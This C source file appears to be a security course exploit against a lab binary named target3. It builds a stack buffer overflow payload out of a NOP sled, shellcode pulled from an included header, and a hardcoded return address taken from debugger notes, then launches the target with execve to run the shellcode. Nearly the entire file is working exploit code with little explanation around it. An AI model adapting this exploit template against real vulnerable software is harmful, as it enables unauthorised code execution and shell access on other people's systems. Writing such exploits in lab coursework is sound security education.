#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target3"
#define NOP 0x90
#define RETURN_SPACE 5
#define SHELL_SIZE 45
#define TARGET_ADDER 0x40a4fe18 //check the value writes into buf starts at here
#define BUFSIZE 69 // |0x40a4fe18-0x40a4fe58|=x40=64, 64 + 5(ret addr)
/* i f (of foo)
 * rsp: 0x40a4fe50, rip:0x40a4fe58
 * p &buf: 0x40a4fe10 (64 bytes)*/

int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];

	args[0] = TARGET;
	args[1] = "hi there";
	
	char buf_overflow[BUFSIZE];
	int i;
	char target_addr[] = "\x18\xfe\xa4\x40";

	//fill buf's end with guessed return address (little endian)
	for(i=0; i < 4; i++)
		buf_overflow[BUFSIZE-RETURN_SPACE+i] = target_addr[i]; 	
	
	//fill middle of buf with shellcode
	for(i=BUFSIZE - SHELL_SIZE - RETURN_SPACE; i < BUFSIZE-RETURN_SPACE; i++)
		buf_overflow[i] = shellcode[i- BUFSIZE + SHELL_SIZE + RETURN_SPACE];

	//fill the first (rest) part of buf with NOPs
	for(i=0; i < BUFSIZE-SHELL_SIZE-RETURN_SPACE; i++)
		buf_overflow[i] = NOP;

	buf_overflow[BUFSIZE-1] = '\0';

	args[0] = TARGET;
	args[1] = buf_overflow;
	args[2] = NULL;

	env[0] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
